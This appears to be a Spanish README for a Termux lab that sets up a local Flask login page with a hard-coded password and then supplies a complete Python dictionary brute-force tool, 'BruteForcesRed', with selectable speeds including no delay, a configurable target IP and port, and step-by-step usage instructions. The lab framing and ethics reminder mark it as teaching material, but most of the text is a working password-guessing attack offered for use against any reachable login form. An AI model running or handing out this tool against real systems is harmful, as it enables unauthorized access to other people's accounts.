# LABORATORIO365
INSTALACCION
### 1. Configuración de Termux

Primero, asegúrate de tener Python y Flask instalados en Termux. Si no lo has hecho, ejecuta los siguientes comandos:

```bash
pkg install python
pip install Flask
```

### 2. Crear la Página Web

Crea un archivo llamado `app.py` que contendrá el servidor Flask y la lógica de la página de inicio de sesión:

```bash
nano app.py
```

Luego, inserta el siguiente código:

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

# Contraseña correcta
correct_password = "secreta123"

# Página de inicio de sesión
html_template = """
<!doctype html>
<html>
<head>
    <title>Prueba de Penetración</title>
</head>
<body>
    <h1>Iniciar Sesión</h1>
    <form method="POST">
        <input type="password" name="password" placeholder="Contraseña" required>
        <button type="submit">Entrar</button>
    </form>
    {% if message %}
        <p>{{ message }}</p>
    {% endif %}
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def login():
    message = ""
    if request.method == 'POST':
        password = request.form.get('password')
        if password == correct_password:
            message = "¡Acceso concedido!"
        else:
            message = "Contraseña incorrecta. Inténtalo de nuevo."
    return render_template_string(html_template, message=message)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```

Este código crea una simple página web que solicita una contraseña. Si se introduce la contraseña correcta (`secreta123`), se concede acceso; de lo contrario, se muestra un mensaje de error.

### 3. Ejecutar la Aplicación

Guarda y cierra el archivo `app.py`. Luego, ejecuta el servidor Flask con el siguiente comando:

```bash
python app.py
```

La aplicación estará disponible en `http://127.0.0.1:5000/`.

### 4. Crear un Script en Python para Averiguar la Contraseña

He añadido un mensaje al salir del programa que muestra el texto que solicitaste. Aquí tienes el código modificado:

### Código Modificado

```python
import requests
import time
import os
from colorama import Fore, Style, init

# Inicializar colorama
init(autoreset=True)

# ASCII Art de Dragón
dragon_logo = r"""
           __====-_  _-====__
         _--^^^#####//      \\#####^^^--_
      _-^##########// (    ) \\##########^-_
     -############//  |\^^/|  \\############-
   _/############//   (@::@)   \\############\_
  /#############((      \\//      ))#############\
 -###############\\     (oo)     //###############-
-#################\\    / "" \    //#################-
-###################\\  /     \  //###################-
-####################\\/       \\####################-
_#/|##########/\######(         )######/\##########|\#_
|/ |#/\#/\#/\/  \#/\##\       /##/\#/  \/\#/\#/\#\| \
   |/  V  |/     V  |         |  V     \|  V  |  \
"""

def limpiar_pantalla():
    os.system('clear' if os.name == 'posix' else 'cls')

def mostrar_menu():
    limpiar_pantalla()
    print(Fore.RED + "\n" + "BruteForcesRed".center(50, ' '))
    print(Fore.GREEN + dragon_logo)
    print(Fore.GREEN + "by red365\n")
    print(Fore.GREEN + "Menú:")
    print(Fore.GREEN + "1. Iniciar Brute Force")
    print(Fore.GREEN + "2. Iniciar RED FAST BRUTE FORCE")
    print(Fore.GREEN + "3. Ingresar contraseña manualmente")
    print(Fore.GREEN + "4. Ver diccionario de contraseñas")
    print(Fore.GREEN + "5. Instrucciones de uso")
    print(Fore.GREEN + "6. Usar otro diccionario")
    print(Fore.GREEN + "7. Cambiar IP (actual: {})".format(ip))
    print(Fore.GREEN + "8. Cambiar Puerto (actual: {})".format(puerto))
    print(Fore.GREEN + "9. Salir")

def ver_diccionario(diccionario):
    print(Fore.GREEN + "Contenido del diccionario:")
    try:
        with open(diccionario, 'r') as f:
            contras = f.readlines()
            for con in contras:
                print(Fore.GREEN + con.strip())
    except FileNotFoundError:
        print(Fore.RED + "No se encontró el diccionario.")
    input(Fore.YELLOW + "\nPresiona Enter para volver al menú...")  # Esperar entrada

def instrucciones():
    print(Fore.GREEN + "Instrucciones de Uso:")
    print(Fore.GREEN + "1. Asegúrate de tener el archivo 'diccionario.txt' en la misma carpeta que este script.")
    print(Fore.GREEN + "2. Selecciona 'Iniciar Brute Force' para comenzar el ataque.")
    print(Fore.GREEN + "3. Observa el progreso en la consola.")
    print(Fore.GREEN + "4. Puedes volver a intentar con otro diccionario o salir.")
    input(Fore.YELLOW + "\nPresiona Enter para volver al menú...")  # Esperar entrada

def iniciar_brute_force(diccionario, ip, puerto, velocidad=1):
    # URL de la página de inicio de sesión
    url = f"http://{ip}:{puerto}/"
    
    # Cargar contraseñas desde el diccionario
    try:
        with open(diccionario, 'r') as f:
            passwords = f.read().splitlines()  # Lee las contraseñas en una lista
    except FileNotFoundError:
        print(Fore.RED + "No se encontró el diccionario.")
        input(Fore.YELLOW + "\nPresiona Enter para volver al menú...")  # Esperar entrada
        return
    
    # Intentar cada contraseña en el diccionario
    for password in passwords:
        print(Fore.YELLOW + f"Probando contraseña: {password}...", end='')
        response = requests.post(url, data={"password": password})
        
        # Simular una animación de prueba
        time.sleep(velocidad)  # Esperar según la velocidad especificada
        
        if "¡Acceso concedido!" in response.text:
            print(Fore.GREEN + f" ✓ Contraseña encontrada: {password}")
            input(Fore.YELLOW + "\nPresiona Enter para volver al menú...")  # Esperar entrada
            return
        else:
            print(Fore.RED + f" X Contraseña incorrecta: {password}")
    
    print(Fore.RED + "No se encontró ninguna contraseña en el diccionario.")
    input(Fore.YELLOW + "\nPresiona Enter para volver al menú...")  # Esperar entrada

def iniciar_fast_brute_force(diccionario, ip, puerto):
    print(Fore.GREEN + "Selecciona la velocidad:")
    print(Fore.GREEN + "1. 2x (rápido)")
    print(Fore.GREEN + "2. 3x (muy rápido)")
    print(Fore.GREEN + "3. 4x (ultra rápido)")
    print(Fore.GREEN + "4. Sin pausa (máxima velocidad)")
    velocidad_opcion = input(Fore.GREEN + "Selecciona una opción (1-4): ")
    
    if velocidad_opcion == '1':
        iniciar_brute_force(diccionario, ip, puerto, velocidad=0.5)  # Velocidad rápida
    elif velocidad_opcion == '2':
        iniciar_brute_force(diccionario, ip, puerto, velocidad=0.33)  # Muy rápido
    elif velocidad_opcion == '3':
        iniciar_brute_force(diccionario, ip, puerto, velocidad=0.25)  # Ultra rápido
    elif velocidad_opcion == '4':
        iniciar_brute_force(diccionario, ip, puerto, velocidad=0)  # Sin pausa
    else:
        print(Fore.RED + "Opción no válida. Se usará velocidad predeterminada.")
        iniciar_brute_force(diccionario, ip, puerto)

def ingresar_contraseña_manual(ip, puerto):
    password = input(Fore.GREEN + "Introduce la contraseña a probar: ")
    url = f"http://{ip}:{puerto}/"
    print(Fore.YELLOW + f"Probando contraseña: {password}...", end='')
    response = requests.post(url, data={"password": password})
    
    if "¡Acceso concedido!" in response.text:
        print(Fore.GREEN + f" ✓ Contraseña encontrada: {password}")
    else:
        print(Fore.RED + f" X Contraseña incorrecta: {password}")
    
    input(Fore.YELLOW + "\nPresiona Enter para volver al menú...")  # Esperar entrada

def usar_otro_diccionario():
    diccionario = input(Fore.GREEN + "Introduce el nombre del diccionario (debe estar en la misma carpeta): ")
    return diccionario

def cambiar_ip():
    nueva_ip = input(Fore.GREEN + "Introduce la nueva IP: ")
    print(Fore.GREEN + f"IP cambiada a: {nueva_ip}")
    return nueva_ip

def cambiar_puerto():
    nuevo_puerto = input(Fore.GREEN + "Introduce el nuevo puerto: ")
    print(Fore.GREEN + f"Puerto cambiado a: {nuevo_puerto}")
    return nuevo_puerto

def main():
    global diccionario
    global ip
    global puerto
    diccionario = 'diccionario.txt'  # Diccionario predeterminado
    ip = '127.0.0.1'  # IP predeterminada
    puerto = '5000'  # Puerto predeterminado

    while True:
        mostrar_menu()
        opcion = input(Fore.GREEN + "Selecciona una opción: ")
        
        if opcion == '1':
            iniciar_brute_force(diccionario, ip, puerto)
        elif opcion == '2':
            iniciar_fast_brute_force(diccionario, ip, puerto)
        elif opcion == '3':
            ingresar_contraseña_manual(ip, puerto)
        elif opcion == '4':
            ver_diccionario(diccionario)
        elif opcion == '5':
            instrucciones()
        elif opcion == '6':
            diccionario = usar_otro_diccionario()
        elif opcion == '7':
            ip = cambiar_ip()
        elif opcion == '8':
            puerto = cambiar_puerto()
        elif opcion == '9':
            print(Fore.GREEN + "Saliendo...")
            print(Fore.BLUE + "The Termux Syndicate - \"EXPLORAMOS CON ÉTICA, PROTEGEMOS CON UNIDAD\"")
            break
        else:
            print(Fore.RED + "Opción no válida. Inténtalo de nuevo.")
            input(Fore.YELLOW + "\nPresiona Enter para volver al menú...")  # Esperar entrada

if __name__ == "__main__":
    main()
```


### Instrucciones de Uso para BruteForcesRed

1. **Configuración Inicial**:
   - Primero, asegúrate de tener Python instalado en Termux. Si no lo tienes, puedes instalarlo con:
     ```bash
     pkg install python
     ```
   - Luego, instala las dependencias necesarias ejecutando:
     ```bash
     pip install requests colorama
     ```
   - Es importante que coloques el archivo de diccionario de contraseñas (por ejemplo, `diccionario.txt`) en la misma carpeta que el script `brute_force.py`.

2. **Ejecución del Script**:
   - Abre Termux y navega hasta la carpeta donde guardaste tu archivo `brute_force.py`.
   - Para ejecutar el script, simplemente escribe:
     ```bash
     python brute_force.py
     ```

3. **Menú Principal**:
   - Una vez que inicie el programa, verás un menú con varias opciones:
     1. **Iniciar Brute Force**: Comienza un ataque de fuerza bruta utilizando el diccionario que elegiste.
     2. **Iniciar RED FAST BRUTE FORCE**: Comienza un ataque de fuerza bruta a diferentes velocidades. Tendrás la opción de elegir entre varias velocidades (2x, 3x, 4x o sin pausa).
     3. **Ingresar contraseña manualmente**: Si prefieres, puedes probar una contraseña específica ingresándola manualmente.
     4. **Ver diccionario de contraseñas**: Si deseas, puedes revisar el contenido del archivo del diccionario.
     5. **Instrucciones de uso**: Si en algún momento necesitas recordar cómo usar el programa, selecciona esta opción.
     6. **Usar otro diccionario**: Si quieres cambiar el archivo de diccionario, puedes hacerlo aquí (recuerda que debe estar en la misma carpeta).
     7. **Cambiar IP**: Si necesitas cambiar la dirección IP que utilizarás para el ataque, elige esta opción.
     8. **Cambiar Puerto**: Puedes cambiar el puerto que usarás para el ataque con esta opción.
     9. **Salir**: Cuando termines, selecciona esta opción para cerrar el programa.

4. **Atacar con Fuerza Bruta**:
   - Al seleccionar "Iniciar Brute Force", el programa comenzará a probar las contraseñas del diccionario en la URL que has especificado (con la IP y el puerto que elegiste).
   - Verás mensajes que indican si cada contraseña es correcta o incorrecta, junto con un símbolo que lo refleja (✓ para correcta y X para incorrecta).

5. **Configuración de IP y Puerto**:
   - Puedes cambiar la IP y el puerto en cualquier momento seleccionando las opciones 7 y 8 en el menú.
   - Antes de cambiar, se mostrará la IP o puerto actual para que sepas lo que estás modificando.

6. **Finalizando el Programa**:
   - Puedes salir del programa en cualquier momento seleccionando la opción 9.
   - Al hacerlo, aparecerá un mensaje que dice: *"The Termux Syndicate - "EXPLORAMOS CON ÉTICA, PROTEGEMOS CON UNIDAD"*.

### Recomendaciones
- Recuerda siempre usar este programa de manera ética y solo en sistemas donde tengas permiso para realizar pruebas de penetración.
- Asegúrate de que la URL y las credenciales que estás probando sean legítimas y que estés autorizado para hacerlo.

---
